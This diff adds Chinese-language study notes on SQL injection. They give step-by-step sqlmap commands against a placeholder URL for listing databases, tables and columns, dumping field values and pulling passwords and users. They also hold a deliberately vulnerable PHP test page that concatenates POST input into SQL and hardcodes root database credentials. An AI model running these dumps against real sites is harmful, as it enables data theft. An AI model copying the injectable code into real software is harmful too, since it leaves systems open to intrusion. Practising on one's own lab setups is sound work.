@@ -1,0 +1,69 @@
+SQL注入:(默认有漏洞)
+	A.SqlMap工具测试
+		A1.安装
+			sqlmap是用python编写的,所以使用是要确保python环境是否安装,
+			安装过后,进入到对应的sqlmap路径,进行测试
+			windows:
+				进入后新建一个 run.cmd => cmd.exe (指定到当前路径)
+				运行如下
+					python sqlmap.py -u "http://www.abc.com?id=1"   step1
+			linuxs:
+				直接使用	
+					python sqlmap.py -u "http://www.abc.com?id=1"  	step1
+		A2.步骤
+			运行 step1 后,根据提示查看对应的信息 
+			根据 back-end DBMS 的信息去测试对应的数据库类型
+			 step2:
+					python sqlmap.py -u "http://www.abc.com?id=1" --dbms mysql 
+			 step3: (获取数据库)
+					python sqlmap.py -u "http://www.abc.com?id=1" --dbms mysql --dbs 
+			 step4: (获取sokmin数据库中的 tables)
+			 		python sqlmap.py -u "http://www.abc.com?id=1" --dbms mysql -D sokmin --tables
+			 step5: (获取sokmin数据库中的 abc表里的字段)
+			 		python sqlmap.py -u "http://www.abc.com?id=1" --dbms mysql -D sokmin -T abc --columns
+			 step5: (获取sokmin数据库中的 abc表中value和name字段的值)
+			 		python sqlmap.py -u "http://www.abc.com?id=1" --dbms mysql -D sokmin -T abc -C "value,name"	 --dump
+			 简单参数介绍:
+			 		--level				对应检测的等级 		eg: --level 3 等级越高检查越详细 最高5	
+			 		--dbms  			对应数据库类型(MySQL, Oracle,IBM DB2, SQLite, Firebir等)
+			 		--dbs 				获取所有数据库 		-D
+			 		--tables			获取库中所有的表 	-T
+			 		--columns			获取库中表里的字段 	-C
+			 		--dump				打印出对应字段的值
+			 		--data				通过post发送数据  		eg:  --data "id=1"
+			 		--param-del=""		post多参数时,删除链接符 eg: --data "id=1;name=abc" --param-del=";"
+			 		--cookie			cookie注入				eg: --cookie "id=3"
+			 		--passwords			获取对应的密码
+			 		--current-user 		获取当前用户
+			 		--users				获取所用用户
+		A3.简单测试 test.php 内容如下:
+					<?php
+						$dbh = new PDO('mysql:host=localhost;dbname=sokmin', 'root','123456ss');    
+						$dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);    
+						$dbh->exec('set names utf8');   
+
+						$sql = " select * from abc " ;
+						$where = " where 1=1 " ;
+						if(array_key_exists('id',$_POST)) {
+							if($_POST['id']) {
+								$where .= " AND id = ".$_POST['id'] ;
+							}
+							if($_POST['type']) {
+								$where .= " AND type = ".$_POST['type'] ;
+							}
+						}else {
+							echo 'argument not ';
+							exit();
+						}
+						$info = $dbh->query($sql.$where);
+						while($row = $info->fetch(PDO::FETCH_ASSOC)){       
+						 print_r($row);    
+						} 
+					?>
+
+
+		友情提示
+			http://www.cnblogs.com/hongfei/p/3872156.html    SqlMap详细使用讲解
+
+
+	B.Sql语法注入			 		
